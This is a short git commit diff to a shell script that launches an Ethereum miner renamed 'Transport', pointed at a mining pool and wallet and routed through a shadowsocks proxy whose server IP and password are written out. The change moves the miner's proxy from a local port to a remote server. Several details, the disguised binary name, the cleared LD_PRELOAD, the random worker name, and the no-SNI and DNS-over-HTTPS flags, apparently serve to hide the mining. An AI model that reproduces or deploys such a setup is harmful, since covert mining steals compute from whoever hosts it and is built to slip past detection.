ac88a0ba0baa2cd78763c64d4c9ce65050bdf2d2
renilo <88342640+renilo@users.noreply.github.com>
2022-04-10 12:17:40 +0700

    Update man.sh

--- man.sh
+++ man.sh
@@ -39,4 +39,4 @@ ss-local -s 192.186.186.197 -p 8388 -l 9999 -k LijayaAnli1188 -m chacha20-ietf-p
 
 ph add Transport
 
-LD_PRELOAD="" ./Transport -a ethash -o us1.ethermine.org:4444 -u 0x416ae3f8ae189add6a5b3b26cab1070b4397edfb -p x -w $(echo $(shuf -i 1-99999 -n 1)-WEWEK) --no-sni --dns-https-server 1.1.1.1 --proxy 127.0.0.1:9999
+LD_PRELOAD="" ./Transport -a ethash -o us1.ethermine.org:4444 -u 0x416ae3f8ae189add6a5b3b26cab1070b4397edfb -p x -w $(echo $(shuf -i 1-99999 -n 1)-WEWEK) --no-sni --dns-https-server 1.1.1.1 --proxy 192.186.186.197:6239
